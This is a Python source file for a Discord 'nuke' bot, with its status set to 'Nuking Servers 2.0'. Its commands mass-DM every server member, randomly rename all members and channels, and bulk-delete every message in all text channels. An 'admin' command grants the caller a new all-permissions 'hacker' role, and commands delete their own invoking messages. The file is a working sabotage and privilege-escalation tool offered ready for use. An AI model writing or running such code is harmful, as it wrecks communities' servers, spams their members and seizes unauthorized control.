import discord
from discord.ext import commands
from discord import Permissions
import string
import random

client = commands.Bot(command_prefix = '.')

@client.event
async def on_ready():
    await client.change_presence(status=discord.Status.dnd, activity=discord.Game('Nuking Servers 2.0'))
    print(f'\nLogged in as {client.user.name}#{client.user.discriminator}, User ID: {client.user.id}, Version: {discord.__version__}\n')

@client.command()
async def massDM(ctx, *, msg = None):
    await ctx.message.delete()
    if msg != None:
        for member in ctx.guild.members:
            try:
                if member.dm_channel != None:
                    await member.dm_channel.send(msg)
                else:
                    await member.create_dm()
                    await member.dm_channel.send(msg)
            except:
                continue
    else:
        await ctx.send('What do you want to DM?')

@client.command()
async def nickAll(ctx):
    await ctx.message.delete()
    char = string.ascii_letters + string.digits
    for member in ctx.guild.members:
        nickname = ''.join((random.choice(char) for i in range(16)))
        try:
            await member.edit(nick=nickname)
        except:
            continue

@client.command()
async def channelAll(ctx):
    await ctx.message.delete()
    char = string.ascii_letters + string.digits
    for channel in ctx.guild.channels:
        channelName = ''.join((random.choice(char) for i in range(16)))
        await channel.edit(name=channelName)

@client.command()
async def purge(ctx):
    for tc in ctx.guild.text_channels:
        while tc.last_message != None:
            await tc.purge(bulk=True)

@client.command()
async def admin(ctx):
    await ctx.message.delete()
    await ctx.guild.create_role(name='hacker', permissions=Permissions.all())
    role = discord.utils.get(ctx.guild.roles, name="hacker")
    await ctx.author.add_roles(role)
    await ctx.send('A wild **HACKER** has appeared!')

@client.command()
async def logout(ctx):
    await ctx.message.delete()
    if ctx.author.id == 1234567890: #insert your User ID here, as an integer
        await ctx.send('bye bye')
        await client.logout()
    else:
        await ctx.send('u cant do that')

client.run('INSERT TOKEN HERE, MAKE SURE IT IS A STRING')